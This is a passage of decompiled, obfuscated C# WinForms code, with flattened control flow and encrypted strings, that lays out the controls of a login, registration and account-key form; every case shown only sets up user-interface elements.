            num1 = (int) num3 * -401358831 ^ 1772385893;
            continue;
          case 165:
            ((Ports) this).usrkeyreg.TabIndex = 65;
            ((Ports) this).usrkeyreg.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * 360784946 ^ -394273698;
            continue;
          case 166:
            ((Ports) this).DrakeUITabControl1.Controls.Add((Control) ((Ports) this).TabPage2);
            ((Ports) this).DrakeUITabControl1.Controls.Add((Control) ((Ports) this).TabPage1);
            ((Ports) this).DrakeUITabControl1.Controls.Add((Control) ((Ports) this).TabPage3);
            ((Ports) this).DrakeUITabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
            num1 = (int) num3 * 1900017201 ^ -1627581517;
            continue;
          case 167:
            ((Ports) this).Label1.Margin = new Padding(2, 0, 2, 0);
            num1 = (int) num3 * 1680021017 ^ 119828769;
            continue;
          case 168:
            ((Ports) this).regbtn.TabIndex = 66;
            num1 = (int) num3 * 265723321 ^ -899160637;
            continue;
          case 169:
            ((Ports) this).CHIDpassword.PasswordChar = '•';
            ((Ports) this).CHIDpassword.Radius = 10;
            ((Ports) this).CHIDpassword.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Ports) this).CHIDpassword.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -36134728 ^ -1458011654;
            continue;
          case 170:
            ((Ports) this).regbtn.SymbolSize = 0;
            num1 = (int) num3 * 1478156481 ^ 598397853;
            continue;
          case 171:
            ((Ports) this).TabPage2.Controls.Add((Control) ((Ports) this).usrkeytext);
            num1 = (int) num3 * 1002783621 ^ -722119565;
            continue;
          case 172:
            ((Ports) this).pnl0 = new Panel();
            num1 = (int) num3 * 1937564153 ^ 421722330;
            continue;
          case 173:
            ((Ports) this).loginbtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * -844164977 ^ -1625360208;
            continue;
          case 174:
            ((Ports) this).usremailtext.FillColor = Color.Black;
            ((Ports) this).usremailtext.Font = new Font(EXGuarder.\u0031935320A, 12f);
            ((Ports) this).usremailtext.ForeColor = Color.White;
            ((Ports) this).usremailtext.Location = new Point(4, 60);
            ((Ports) this).usremailtext.Margin = new Padding(4);
            ((Ports) this).usremailtext.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 1020938957 ^ -186548311;
            continue;
          case 175:
            ((Ports) this).CHIDbtn.Font = new Font(EXGuarder.\u0031935320A, 10.5f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 1644251532 ^ 1175045796;
            continue;
          case 176:
            ((Ports) this).loginlabel = new Label();
            ((Ports) this).TabPage1 = new TabPage();
            ((Ports) this).loadingimageR = new DrakeUILoadingBar();
            ((Ports) this).keyText = new DrakeUITextBox();
            num1 = (int) num3 * 1911574879 ^ 1462035037;
            continue;
          case 177:
            ((Ports) this).DrakeUIToolTip1.ForeColor = Color.FromArgb(239, 239, 239);
            ((Ports) this).DrakeUIToolTip1.OwnerDraw = true;
            ((Ports) this).ToolTip1.BackColor = Color.Black;
            num1 = (int) num3 * -875471555 ^ 1115578980;
            continue;
          case 178:
            ((Ports) this).pnl1.Dock = DockStyle.Fill;
            num1 = (int) num3 * 2043788675 ^ 59146472;
            continue;
          case 179:
            ((Ports) this).CHIDpassword.Size = new Size(303, 27);
            ((Ports) this).CHIDpassword.Style = UIStyle.Custom;
            ((Ports) this).CHIDpassword.TabIndex = 72;
            ((Ports) this).CHIDpassword.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * 1248968990 ^ -1210979789;
            continue;
          case 180:
            ((Ports) this).Label2 = new Label();
            ((Ports) this).qutelabel = new Label();
            num1 = (int) num3 * 758007718 ^ 756041232;
            continue;
          case 181:
            ((Ports) this).loginbtn.RectHoverColor = Color.White;
            num1 = (int) num3 * 745065487 ^ -820901146;
            continue;
          case 182:
            ((Ports) this).DrakeUILoadingBar1 = new DrakeUILoadingBar();
            num1 = (int) num3 * -1246451694 ^ 560476777;
            continue;
          case 183:
            ((Ports) this).keyText.Margin = new Padding(4);
            num1 = (int) num3 * -122560989 ^ 1120509862;
            continue;
          case 184:
            ((Ports) this).DrakeUITabControl1.Name = EXGuarder.\u003184D4008;
            num1 = (int) num3 * 1710595116 ^ -740499075;
            continue;
          case 185:
            ((Ports) this).CHIDpassword.Location = new Point(4, 95);
            num1 = (int) num3 * -509261523 ^ 48672106;
            continue;
          case 186:
            ((Ports) this).regbtn.BackColor = Color.Transparent;
            num1 = (int) num3 * -215823301 ^ 1407537969;
            continue;
          case 187:
            ((Ports) this).usremailtext.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 81411184 ^ -184286319;
            continue;
          case 188:
            ((Ports) this).usrkeytext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Ports) this).usrkeytext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 173688352 ^ -521939434;
            continue;
          case 189:
            ((Ports) this).TabPage3.Controls.Add((Control) ((Ports) this).CHIDbtn);
            num1 = (int) num3 * 357296951 ^ -1727457152;
            continue;
          case 190:
            ((Ports) this).CHIDbtn.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * 192812821 ^ -271768190;
            continue;
          case 191:
            ((Ports) this).loginworker = new BackgroundWorker();
            num1 = (int) num3 * 458019548 ^ -374160991;
            continue;
          case 192:
            ((Ports) this).usremailtextreg.FillColor = Color.Black;
            ((Ports) this).usremailtextreg.Font = new Font(EXGuarder.\u0031935320A, 12f);
            num1 = (int) num3 * -759837204 ^ -206138931;
            continue;
          case 193:
            ((Ports) this).loadingimageR.Location = new Point(362, 167);
            num1 = (int) num3 * -720922471 ^ -1197391709;
            continue;
          case 194:
            ((Ports) this).PictureBox1.TabStop = false;
            ((Ports) this).Panel1.BackColor = Color.FromArgb(18, 11, 13);
            num1 = (int) num3 * -732721688 ^ -1136760262;
            continue;
          case 195:
            ((Ports) this).usremailtextreg.Radius = 10;
            num1 = (int) num3 * 1675001440 ^ -1339955893;
            continue;
          case 196:
            ((Ports) this).usrkeyreg.PasswordChar = '•';
            ((Ports) this).usrkeyreg.Radius = 10;
            num1 = (int) num3 * -720065701 ^ 2101250296;
            continue;
          case 197:
            ((Ports) this).CHIDbtn.ForeColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * 1750062683 ^ -1910534994;
            continue;
          case 198:
            ((Ports) this).TabPage1.Name = EXGuarder.\u0030C073D10;
            num1 = (int) num3 * 10527475 ^ -267640020;
            continue;
          case 199:
            ((Ports) this).regbtn.FillPressColor = Color.Black;
            ((Ports) this).regbtn.FillSelectedColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * 123877642 ^ -1095102967;
            continue;
          case 200:
            ((Ports) this).DrakeUILinkLabel1.Font = new Font(EXGuarder.\u0031935320A, 9f);
            num1 = (int) num3 * 555267038 ^ 1606502483;
            continue;
          case 201:
            ((Ports) this).usremailtext.Name = EXGuarder.\u0031801593E;
            ((Ports) this).usremailtext.Padding = new Padding(5, 4, 5, 4);
            ((Ports) this).usremailtext.Radius = 10;
            num1 = (int) num3 * 1826898112 ^ -1336635712;
            continue;
          case 202:
            ((Ports) this).policylink.Location = new Point(0, 447);
            num1 = (int) num3 * -1182294109 ^ -1206883043;
            continue;
          case 203:
            ((Ports) this).PictureBox1.Dock = DockStyle.Fill;
            num1 = (int) num3 * 804501287 ^ -898207652;
            continue;
          case 204:
            ((Ports) this).DrakeUITabControl1.MenuStyle = UIMenuStyle.Custom;
            num1 = (int) num3 * -1479558890 ^ -291779841;
            continue;
          case 205:
            ((Ports) this).Label2.Size = new Size(309, 56);
            num1 = (int) num3 * -1362132433 ^ 914470922;
            continue;
          case 206:
            ((Ports) this).Panel1.Controls.Add((Control) ((Ports) this).welclabel);
            ((Ports) this).Panel1.Controls.Add((Control) ((Ports) this).PictureBox2);
            num1 = (int) num3 * 1869612722 ^ 1714117458;
            continue;
          case 207:
            ((Ports) this).CHIDbtn.FillColor = Color.Transparent;
            num1 = (int) num3 * -1258780119 ^ 1512302443;
            continue;
          case 208:
            ((Ports) this).regbtn.RectHoverColor = Color.White;
            num1 = (int) num3 * -1283519352 ^ -1201859559;
            continue;
          case 209:
            ((Ports) this).TabPage3.Controls.Add((Control) ((Ports) this).CHIDaccount);
            ((Ports) this).TabPage3.Controls.Add((Control) ((Ports) this).Label2);
            ((Ports) this).TabPage3.Location = new Point(0, 40);
            ((Ports) this).TabPage3.Name = EXGuarder.\u003581C0D55;
            num1 = (int) num3 * -1883712484 ^ -1788966313;
            continue;
          case 210:
            ((Ports) this).usremailtextreg.ForeColor = Color.White;
            num1 = (int) num3 * 543188468 ^ 1174667773;
            continue;
          case 211:
            ((Ports) this).CHIDbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Ports) this).CHIDbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Ports) this).CHIDbtn.RectHoverColor = Color.White;
            ((Ports) this).CHIDbtn.RectPressColor = Color.White;
            num1 = (int) num3 * -2094737827 ^ -732005892;
            continue;
          case 212:
            ((Ports) this).exitbtn.Symbol = 61453;
            num1 = (int) num3 * -544120856 ^ -1907589486;
            continue;
          case 213:
            ((Ports) this).keyText.FillColor = Color.Black;
            num1 = (int) num3 * -2037516062 ^ 331932183;
            continue;
          case 214:
            ((Ports) this).exitbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -572470197 ^ -1913898108;
            continue;
          case 215:
            ((ISupportInitialize) ((Ports) this).PictureBox1).BeginInit();
            ((Ports) this).Panel1.SuspendLayout();
            num1 = (int) num3 * 1345544515 ^ -856596232;
            continue;
          case 216:
            ((Ports) this).regbtn.RectSelectedColor = Color.White;
            num1 = (int) num3 * -1963331803 ^ -1511687314;
            continue;
          case 217:
            ((Ports) this).Label1.Text = EXGuarder.\u0034F474D69;
            ((Ports) this).Label1.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * 612593809 ^ -1155622399;
            continue;
          case 218:
            ((Ports) this).usrkeyreg.Name = EXGuarder.\u003044A6501;
            num1 = (int) num3 * -1194829673 ^ 1774341426;
            continue;
          case 219:
            ((Ports) this).usrkeytext.Name = EXGuarder.\u003653D5442;
            ((Ports) this).usrkeytext.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * -1750945708 ^ 1169323908;
            continue;
          case 220:
            ((Ports) this).Label3.Size = new Size(75, 15);
            ((Ports) this).Label3.TabIndex = 31;
            ((Ports) this).Label3.Text = EXGuarder.\u00342155246;
            num1 = (int) num3 * -1851452745 ^ -2045591145;
            continue;
          case 221:
            ((Ports) this).pnl0.SuspendLayout();
            this.SuspendLayout();
            ((Ports) this).pnl1.BackColor = Color.Black;
            num1 = (int) num3 * 1742214893 ^ 944671278;
            continue;
          case 222:
            ((Ports) this).regbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * -747430702 ^ -674617950;
            continue;
          case 223:
            ((Ports) this).DrakeUILoadingBar1.StyleCustomMode = true;
            ((Ports) this).DrakeUILoadingBar1.TabIndex = 67;
            num1 = (int) num3 * 1788868332 ^ -1378337714;
            continue;
          case 224:
            this.ResumeLayout(false);
            num1 = (int) num3 * -2011814844 ^ 275530921;
            continue;
          case 225:
            ((Ports) this).DrakeUILinkLabel1.Size = new Size(320, 29);
            num1 = (int) num3 * 525544236 ^ 1610139783;
            continue;
          case 226:
            ((Ports) this).keyText.Size = new Size(303, 27);
            num1 = (int) num3 * -754729289 ^ -1864932061;
            continue;
          case 227:
            ((Ports) this).policylink.TabStop = true;
            ((Ports) this).policylink.Text = EXGuarder.\u0036C443B5C;
            ((Ports) this).policylink.TextAlign = ContentAlignment.MiddleCenter;
            ((Ports) this).policylink.VisitedLinkColor = Color.FromArgb(230, 80, 80);
            ((Ports) this).Label13.BackColor = Color.Transparent;
            ((Ports) this).Label13.Font = new Font(EXGuarder.\u0031935320A, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            ((Ports) this).Label13.ForeColor = Color.Black;
            num1 = (int) num3 * 1027358698 ^ -1810561898;
            continue;
          case 228:
            ((Ports) this).usrkeyreg.Style = UIStyle.Custom;
            num1 = (int) num3 * 232610242 ^ 2114865216;
            continue;
          case 229:
            ((Ports) this).welclabel.Name = EXGuarder.\u0034163214D;
            ((Ports) this).welclabel.Size = new Size(320, 44);
            num1 = (int) num3 * 1362027030 ^ 912902761;
            continue;
          case 230:
            ((Ports) this).usremailtextreg.Location = new Point(4, 60);
            num1 = (int) num3 * -1485254553 ^ 22274995;
            continue;
          case 231:
            ((Ports) this).keyText.Watermark = EXGuarder.\u0030D06606D;
            ((Ports) this).DrakeUILoadingBar1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            num1 = (int) num3 * 574793063 ^ 478145539;
            continue;
          case 232:
            ((Ports) this).regbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * -374106375 ^ 715350341;
            continue;
          case 233:
            ((Ports) this).usrkeyreg.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * -683263261 ^ 816230272;
            continue;
          case 234:
            ((Ports) this).Label13.Margin = new Padding(2, 0, 2, 0);
            ((Ports) this).Label13.Name = EXGuarder.\u003090E1D18;
            num1 = (int) num3 * -1762744121 ^ -1835853759;
            continue;
          case 235:
            this.AutoScaleDimensions = new SizeF(6f, 12f);
            num1 = (int) num3 * -480455373 ^ -1638430394;
            continue;
          case 236:
            ((Ports) this).TabPage3.Controls.Add((Control) ((Ports) this).CHIDpassword);
            num1 = (int) num3 * -204235036 ^ -17313532;
            continue;
          case 237:
            ((Ports) this).usrkeyreg.Watermark = EXGuarder.\u003416D0F3C;
            num1 = (int) num3 * 537382680 ^ 1856519399;
            continue;
          case 238:
            ((Ports) this).DrakeUITabControl1.FillColor = Color.FromArgb(18, 11, 13);
            ((Ports) this).DrakeUITabControl1.Font = new Font(EXGuarder.\u003721C5775, 12f);
            num1 = (int) num3 * -429517130 ^ -1495097784;
            continue;
          case 239:
            ((Ports) this).DrakeUITabControl1.TabBackColor = Color.FromArgb(18, 11, 13);
            num1 = (int) num3 * -912466898 ^ 1605818237;
            continue;
          case 240:
            ((Ports) this).qutelabel.TextAlign = ContentAlignment.TopCenter;
            ((Ports) this).welclabel.BackColor = Color.Transparent;
            ((Ports) this).welclabel.Dock = DockStyle.Top;
            num1 = (int) num3 * 1551438189 ^ 41003300;
            continue;
          case 241:
            ((Ports) this).TabPage2.Controls.Add((Control) ((Ports) this).savekey);
            ((Ports) this).TabPage2.Controls.Add((Control) ((Ports) this).loginbtn);
            num1 = (int) num3 * -2140890504 ^ -1618226646;
            continue;
          case 242:
            ((Ports) this).pnl1.PerformLayout();
            num1 = (int) num3 * -377683667 ^ 753757108;
            continue;
          case 243:
            ((Ports) this).usrkeytext.Size = new Size(303, 27);
            ((Ports) this).usrkeytext.Style = UIStyle.Custom;
            num1 = (int) num3 * 945696223 ^ -412622372;
            continue;
          case 244:
            ((Ports) this).savekey.Checked = true;
            ((Ports) this).savekey.Cursor = Cursors.Hand;
            ((Ports) this).savekey.Font = new Font(EXGuarder.\u0031935320A, 12f);
            ((Ports) this).savekey.ForeColor = Color.White;
            num1 = (int) num3 * 850317318 ^ -28042087;
            continue;
          case 245:
            ((Ports) this).CHIDpassword.Cursor = Cursors.IBeam;
            num1 = (int) num3 * -949374000 ^ 363223597;
            continue;
          case 246:
            ((Ports) this).regworker = new BackgroundWorker();
            num1 = (int) num3 * 1944199539 ^ 313648891;
            continue;
          case 247:
            ((Ports) this).DrakeUILoadingBar1.Location = new Point(1066, 157);
            ((Ports) this).DrakeUILoadingBar1.Name = EXGuarder.\u00377331A46;
            num1 = (int) num3 * -1696493921 ^ 846468727;
            continue;
          case 248:
            ((Ports) this).keyText.TabIndex = 68;
            num1 = (int) num3 * 999637344 ^ -1155730790;
            continue;
          case 249:
            ((Ports) this).statuslabel.Location = new Point(0, 476);
            num1 = (int) num3 * 823812042 ^ 1106000344;
            continue;
          case 250:
            ((Ports) this).Label2.Location = new Point(0, 0);
            ((Ports) this).Label2.Margin = new Padding(2, 0, 2, 0);
            ((Ports) this).Label2.Name = EXGuarder.\u0033B6E3153;
            num1 = (int) num3 * 170972086 ^ 970297312;
            continue;
          case 251:
            ((Ports) this).Label13 = new Label();
            num1 = (int) num3 * 140945674 ^ 1589656302;
            continue;
          case 252:
            ((Ports) this).usremailtext.TabIndex = 58;
            ((Ports) this).usremailtext.TextAlignment = ContentAlignment.TopCenter;
            ((Ports) this).usremailtext.Watermark = EXGuarder.\u00338192E1D;
            num1 = (int) num3 * 1363213270 ^ 666132455;
            continue;
          case 253:
            ((Ports) this).Label2.TextAlign = ContentAlignment.MiddleCenter;
            ((Ports) this).qutelabel.BackColor = Color.Transparent;
            ((Ports) this).qutelabel.Dock = DockStyle.Top;
            num1 = (int) num3 * -998064187 ^ -366317418;
            continue;
          case 254:
            ((Ports) this).CHIDbtn.Name = EXGuarder.\u0036045174D;
            num1 = (int) num3 * 1321848740 ^ -165878382;
            continue;
          case (uint) byte.MaxValue:
            ((Ports) this).exitbtn.FillSelectedColor = Color.FromArgb(254, 0, 0);
            ((Ports) this).exitbtn.Font = new Font(EXGuarder.\u0031935320A, 12f);
            ((Ports) this).exitbtn.ForeColor = Color.FromArgb(254, 0, 0);
            ((Ports) this).exitbtn.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num3 * 1203113628 ^ 1868144136;
            continue;
          case 256:
            ((Ports) this).usrkeyreg.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 1228279381 ^ -1614432083;
            continue;
          case 257:
            ((Ports) this).CHIDimg.Name = EXGuarder.\u0034A1D3B5D;
            num1 = (int) num3 * -416526634 ^ 1457409456;
            continue;
          case 258:
            ((Ports) this).usremailtextreg.Margin = new Padding(4);
            num1 = (int) num3 * 568726618 ^ 1728415971;
            continue;
          case 259:
            ((Ports) this).DrakeUITabControl1.Location = new Point(6, 122);
            num1 = (int) num3 * -201488813 ^ -723554414;
            continue;
          case 260:
            ((Ports) this).qutelabel.Location = new Point(0, 84);
            ((Ports) this).qutelabel.Margin = new Padding(2, 0, 2, 0);
            ((Ports) this).qutelabel.Name = EXGuarder.\u00353265D6C;
            num1 = (int) num3 * -692304922 ^ -902041561;
            continue;
          case 261:
            ((Ports) this).DrakeUITabControl1.ItemSize = new Size(98, 40);
            num1 = (int) num3 * -464067717 ^ -530164235;
            continue;
          case 262:
            this.Text = EXGuarder.\u003154A6F11;
            ((Ports) this).pnl1.ResumeLayout(false);
            num1 = (int) num3 * 1626947218 ^ 1342852717;
            continue;
          case 263:
            ((ISupportInitialize) ((Ports) this).PictureBox2).BeginInit();
            num1 = (int) num3 * 1910353158 ^ -1994824662;
            continue;
          case 264:
            ((Ports) this).qutelabel.Size = new Size(320, 35);
            ((Ports) this).qutelabel.TabIndex = 47;
            ((Ports) this).qutelabel.Text = EXGuarder.\u0031A1A3647;
            num1 = (int) num3 * -1420418829 ^ -919528437;
            continue;
          case 265:
            ((Ports) this).Panel1 = new Panel();
            num1 = (int) num3 * -9298390 ^ -1267865392;
            continue;
          case 266:
            ((Ports) this).DrakeUITabControl1.SelectedIndex = 0;
            ((Ports) this).DrakeUITabControl1.Size = new Size(309, 243);
            ((Ports) this).DrakeUITabControl1.SizeMode = TabSizeMode.Fixed;
            ((Ports) this).DrakeUITabControl1.Style = UIStyle.Custom;
            num1 = (int) num3 * -1125769626 ^ 1714495166;
            continue;
          case 267:
            ((Ports) this).PictureBox2.TabIndex = 30;
            ((Ports) this).PictureBox2.TabStop = false;
            num1 = (int) num3 * -1180935754 ^ -387072620;
            continue;
          case 268:
            ((Ports) this).keyText.Radius = 10;
            num1 = (int) num3 * -1323082661 ^ -1473241061;
            continue;
          case 269:
            ((Ports) this).pnl0.Location = new Point(0, 0);
            num1 = (int) num3 * 977531336 ^ 2118216550;
            continue;
          case 270:
            ((Ports) this).savekey.Location = new Point(4, 129);
            ((Ports) this).savekey.Name = EXGuarder.\u0035A5D3B45;
            ((Ports) this).savekey.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * 2113801637 ^ 898511490;
            continue;
          case 271:
            ((Ports) this).exitbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * -85236308 ^ 117160268;
            continue;
          case 272:
            ((Ports) this).PictureBox2.BackColor = Color.Transparent;
            ((Ports) this).PictureBox2.BackgroundImageLayout = ImageLayout.Zoom;
            ((Ports) this).PictureBox2.Dock = DockStyle.Top;
            ((Ports) this).PictureBox2.Location = new Point(0, 0);
            ((Ports) this).PictureBox2.Name = EXGuarder.\u00333081E5E;
            num1 = (int) num3 * 8020343 ^ -755347868;
            continue;
          case 273:
            ((Ports) this).pnl1.Controls.Add((Control) ((Ports) this).Label13);
            num1 = (int) num3 * -198134157 ^ 986721962;
            continue;
          case 274:
            ((Ports) this).exitbtn.RectPressColor = Color.White;
            num1 = (int) num3 * -1737452010 ^ -1456051098;
            continue;
          case 275:
            ((Ports) this).policylink.Font = new Font(EXGuarder.\u0031935320A, 9f);
            ((Ports) this).policylink.LinkBehavior = LinkBehavior.NeverUnderline;
            ((Ports) this).policylink.LinkColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num3 * 857716466 ^ -765048077;
            continue;
          case 276:
            ((Ports) this).regbtn.Font = new Font(EXGuarder.\u0031935320A, 10.5f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1818646016 ^ 1823672610;
            continue;
          case 277:
            ((Ports) this).Label3.Visible = false;
            ((Ports) this).notpass.Text = EXGuarder.\u00353691F1B;
            num1 = (int) num3 * 1846384411 ^ -1868724287;
            continue;
          case 278:
            ((Ports) this).loadingimage.Size = new Size(23, 24);
            ((Ports) this).loadingimage.Style = UIStyle.Custom;
            ((Ports) this).loadingimage.StyleCustomMode = true;
            num1 = (int) num3 * -202625015 ^ 1572005718;
            continue;
          case 279:
            ((Ports) this).usremailtextreg.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Ports) this).usremailtextreg.Size = new Size(303, 27);
            ((Ports) this).usremailtextreg.Style = UIStyle.Custom;
            num1 = (int) num3 * 627819082 ^ -662901716;
            continue;
          case 280:
            ((Ports) this).CHIDpassword.Margin = new Padding(4);
            ((Ports) this).CHIDpassword.Maximum = (double) int.MaxValue;
            ((Ports) this).CHIDpassword.Minimum = (double) int.MinValue;
            ((Ports) this).CHIDpassword.Name = EXGuarder.\u0035000075D;
            num1 = (int) num3 * -1230063392 ^ -108317586;
            continue;
          case 281:
            ((Ports) this).TabPage2.BackColor = Color.FromArgb(18, 11, 13);
            num1 = (int) num3 * 1216160557 ^ 1543259330;
            continue;
          case 282:
            ((Ports) this).ToolTip1.ForeColor = Color.White;
            num1 = (int) num3 * 152782994 ^ 467780620;
            continue;
          case 283:
            ((Ports) this).exitbtn.FillPressColor = Color.Black;
            num1 = (int) num3 * -858892371 ^ -584210687;
            continue;
          case 284:
            ((Ports) this).usrkeyreg.Cursor = Cursors.IBeam;
            num1 = (int) num3 * -478688282 ^ -287839743;
            continue;
          case 285:
            ((Ports) this).welclabel = new Label();
            ((Ports) this).PictureBox2 = new PictureBox();
            num1 = (int) num3 * 779954168 ^ 806774315;
            continue;
          case 286:
            ((Ports) this).DrakeUILinkLabel1.TabStop = true;
            num1 = (int) num3 * 1600530834 ^ -1426481105;
            continue;
          case 287:
            ((Ports) this).loginlabel.TabIndex = 57;
            num1 = (int) num3 * 360584457 ^ 1842331412;
            continue;
          case 288:
            ((Ports) this).DrakeUITabControl1.TabIndex = 53;
            num1 = (int) num3 * 2105538494 ^ 1877534701;
            continue;
          case 289:
            ((Ports) this).statuslabel = new Label();
            ((Ports) this).Label3 = new Label();
            // ISSUE: reference to a compiler-generated field
            ((Ports) this).notpass = new NotifyIcon(((Ports._Closure\u0024__229\u002D1) this).components);
            // ISSUE: reference to a compiler-generated field
            ((Ports) this).DrakeUIToolTip1 = new DrakeUIToolTip(((Ports._Closure\u0024__229\u002D1) this).components);
            // ISSUE: reference to a compiler-generated field
            ((Ports) this).ToolTip1 = new ToolTip(((Ports._Closure\u0024__229\u002D1) this).components);
            // ISSUE: reference to a compiler-generated field
            ((Ports) this).Timer1 = new System.Windows.Forms.Timer(((Ports._Closure\u0024__229\u002D1) this).components);
            num1 = (int) num3 * 1255415445 ^ -693731654;
            continue;
          case 290:
            ((Ports) this).Label1.BackColor = Color.FromArgb(18, 11, 13);
            num1 = (int) num3 * -1143437828 ^ 944132471;
            continue;
          case 291:
            ((Ports) this).TabPage1.Controls.Add((Control) ((Ports) this).Label1);
            num1 = (int) num3 * 1086955622 ^ 1910979400;
            continue;
          case 292:
            ((Ports) this).savekey.BackColor = Color.Transparent;
            num1 = (int) num3 * -1936196028 ^ 1633199605;
            continue;
          case 293:
            ((Ports) this).usrkeyreg.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * -2104266088 ^ 1830077703;
            continue;
          case 294:
            ((Ports) this).policylink.BackColor = Color.Transparent;
            num1 = (int) num3 * 1500885679 ^ 1007787736;
            continue;
          case 295:
            ((Ports) this).loginbtn.Size = new Size(117, 24);
            num1 = (int) num3 * -938213350 ^ -85027258;
            continue;
          case 296:
            ((Ports) this).keyText.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1717007623 ^ -1813575682;
            continue;
          case 297:
            ((Ports) this).pnl1 = new Panel();
            num1 = (int) num3 * -920852644 ^ 1155023042;
            continue;
          case 298:
            ((Ports) this).CHIDimg.Style = UIStyle.Custom;
            ((Ports) this).CHIDimg.StyleCustomMode = true;
            num1 = (int) num3 * 1351929414 ^ 482474283;
            continue;
          case 299:
            ((Ports) this).DrakeUILoadingBar1.Size = new Size(23, 24);
            ((Ports) this).DrakeUILoadingBar1.Style = UIStyle.Custom;
            num1 = (int) num3 * -1258755661 ^ 1679841563;
            continue;
          case 300:
            ((Ports) this).DrakeUILinkLabel1.TabIndex = 49;
            num1 = (int) num3 * 798430831 ^ -288229255;
            continue;
          case 301:
            ((Ports) this).TabPage3.SuspendLayout();
            num1 = (int) num3 * 1294574722 ^ 831484124;
            continue;
          case 302:
            ((Ports) this).usrkeytext.TabIndex = 59;
            ((Ports) this).usrkeytext.TextAlignment = ContentAlignment.TopCenter;
            ((Ports) this).usrkeytext.Watermark = EXGuarder.\u003416D0F3C;
            num1 = (int) num3 * 608651455 ^ -1812242128;
            continue;
          case 303:
            ((Ports) this).Label1.Location = new Point(0, 0);
            num1 = (int) num3 * 1839363685 ^ 721438405;
            continue;
          case 304:
            ((Ports) this).Label3.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * -325705742 ^ 1839963772;
            continue;
          case 305:
            ((Ports) this).pnl0.BackColor = Color.Black;
            ((Ports) this).pnl0.Controls.Add((Control) ((Ports) this).pnl1);
            num1 = (int) num3 * -181170217 ^ 1274713683;
            continue;
          case 306:
            ((Ports) this).DrakeUITabControl1.TabSelectedColor = Color.FromArgb(18, 11, 13);
            ((Ports) this).DrakeUITabControl1.TabSelectedForeColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num3 * 1038646547 ^ 1217475609;
            continue;
          case 307:
            ((Ports) this).loadingimageR.Size = new Size(23, 24);
            num1 = (int) num3 * -1409622049 ^ 122210482;
            continue;
          case 308:
            ((Ports) this).usrkeyreg.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1253516073 ^ -210227542;
            continue;
          case 309:
            ((Ports) this).PictureBox2.Size = new Size(320, 40);
            ((Ports) this).PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num3 * -1796773674 ^ -1884352764;
            continue;
          case 310:
            ((Ports) this).loginbtn.RectPressColor = Color.White;
            num1 = (int) num3 * -706238355 ^ 1975982918;
            continue;
          case 311:
            ((Ports) this).Label1.Name = EXGuarder.\u0033B5D3B0E;
            ((Ports) this).Label1.Size = new Size(309, 56);
            num1 = (int) num3 * 1629008176 ^ -218177812;
            continue;
          case 312:
            ((Ports) this).usrkeytext.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 969094211 ^ -1448852618;
            continue;
          case 313:
            ((Ports) this).CHIDimg.Location = new Point(362, 167);
            num1 = (int) num3 * 977182083 ^ -1541326753;
            continue;
          case 314:
            ((Ports) this).Label2.BackColor = Color.FromArgb(18, 11, 13);
            ((Ports) this).Label2.Dock = DockStyle.Top;
            ((Ports) this).Label2.Font = new Font(EXGuarder.\u0031935320A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1718076410 ^ 1950829877;
            continue;
          case 315:
            ((Ports) this).Label13.TabIndex = 2;
            num1 = (int) num3 * 1072873894 ^ -1585082308;
            continue;
          case 316:
            ((Ports) this).DrakeUITabControl1.TabSelectedHighColor = Color.FromArgb(30, 136, 229);
            ((Ports) this).DrakeUITabControl1.TabUnSelectedForeColor = Color.FromArgb(240, 240, 240);
            num1 = (int) num3 * 493752835 ^ -1808521972;
            continue;
          case 317:
            ((Ports) this).welclabel.Font = new Font(EXGuarder.\u003721C5775, 18f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Ports) this).welclabel.ForeColor = Color.FromArgb(254, 1, 0);
            ((Ports) this).welclabel.Location = new Point(0, 40);
            num1 = (int) num3 * -1486155355 ^ -2773881;
            continue;
          case 318:
            ((Ports) this).statuslabel.TabIndex = 42;
            ((Ports) this).statuslabel.Text = EXGuarder.\u00342155246;
            ((Ports) this).statuslabel.TextAlign = ContentAlignment.MiddleRight;
            num1 = (int) num3 * -1209565362 ^ 110641512;
            continue;
          case 319:
            ((Ports) this).policylink.Dock = DockStyle.Bottom;
